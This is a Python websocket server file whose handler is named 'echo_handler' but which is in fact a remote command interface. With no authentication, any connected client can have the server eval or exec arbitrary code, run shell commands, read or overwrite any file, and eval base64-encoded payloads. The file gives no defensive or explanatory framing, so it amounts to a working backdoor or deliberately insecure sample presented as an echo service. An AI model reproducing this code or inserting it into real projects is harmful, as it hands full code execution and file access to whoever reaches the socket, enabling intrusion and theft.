import asyncio
import websockets
import json
import base64

connected_clients = set()

async def echo_handler(websocket, path):
    connected_clients.add(websocket)
    try:
        async for message in websocket:
            data = json.loads(message)
            command = data.get('command')
            
            if command == 'eval':
                code = data.get('code')
                result = eval(code)
                await websocket.send(json.dumps({'result': str(result)}))
            
            elif command == 'exec':
                code = data.get('code')
                exec(code)
                await websocket.send(json.dumps({'status': 'executed'}))
            
            elif command == 'system':
                import subprocess
                cmd = data.get('cmd')
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                await websocket.send(json.dumps({'output': output.stdout}))
            
            elif command == 'file_read':
                filepath = data.get('path')
                with open(filepath, 'r') as f:
                    content = f.read()
                await websocket.send(json.dumps({'content': content}))
            
            elif command == 'file_write':
                filepath = data.get('path')
                content = data.get('content')
                with open(filepath, 'w') as f:
                    f.write(content)
                await websocket.send(json.dumps({'status': 'written'}))
            
            elif command == 'decode':
                encoded = data.get('data')
                decoded = base64.b64decode(encoded).decode()
                result = eval(decoded)
                await websocket.send(json.dumps({'result': str(result)}))
            
            elif command == 'broadcast':
                message_text = data.get('message')
                for client in connected_clients:
                    if client != websocket:
                        await client.send(json.dumps({'message': message_text}))
    
    finally:
        connected_clients.remove(websocket)

async def main():
    async with websockets.serve(echo_handler, "localhost", 8765):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
